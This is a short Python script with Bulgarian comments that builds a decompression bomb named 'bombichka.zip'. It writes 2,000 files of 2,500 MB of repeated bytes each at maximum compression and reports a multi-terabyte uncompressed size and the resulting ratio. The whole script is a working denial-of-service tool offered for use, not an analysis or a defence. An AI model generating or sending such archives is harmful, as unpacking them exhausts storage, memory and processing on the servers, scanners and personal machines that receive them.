import time
import zipfile
from pathlib import Path

SIZE_PER_FILE_MB = 2500
COPIES = 2000
OUTPUT_FILENAME = "bombichka.zip"


def format_size(size_bytes: float) -> str:
    units = ["B", "KB", "MB", "GB", "TB"]
    size = size_bytes

    for unit in units:
        if size < 1024:
            return f"{size:.2f} {unit}"
        size /= 1024
    return f"{size:.2f} PB"


def create_zip(
        output: Path,
        size_per_file_mb: int,
        copies: int,
) -> None:
    # Създаваме блоков масив от 1 MB нулеви байтове
    chunk = b"0" * (1024 * 1024)

    with zipfile.ZipFile(
            output,
            mode="w",
            compression=zipfile.ZIP_DEFLATED,
            compresslevel=9,
            allowZip64=True,
    ) as zf:
        for i in range(copies):
            filename = f"dummy_{i + 1}.txt"
            with zf.open(filename, mode="w") as f:
                for _ in range(size_per_file_mb):
                    f.write(chunk)


def main() -> None:
    output = Path(OUTPUT_FILENAME)
    start_time = time.time()

    total_uncompressed_mb = SIZE_PER_FILE_MB * COPIES

    print("Генериране на архива, моля изчакайте...")
    create_zip(
        output=output,
        size_per_file_mb=SIZE_PER_FILE_MB,
        copies=COPIES
    )

    compressed_size = output.stat().st_size
    uncompressed_size = total_uncompressed_mb * 1024 * 1024
    compression_ratio = uncompressed_size / compressed_size if compressed_size > 0 else 0
    end_time = time.time()

    print(f"Размер на архива на диска: {format_size(compressed_size)}")
    print(f"Общ обем след разархивиране: {format_size(uncompressed_size)}")
    print(f"Compression ratio: {compression_ratio:,.0f}x")
    print(f"Време за изпълнение: {end_time - start_time:.2f} сек.")


if __name__ == "__main__":
    main()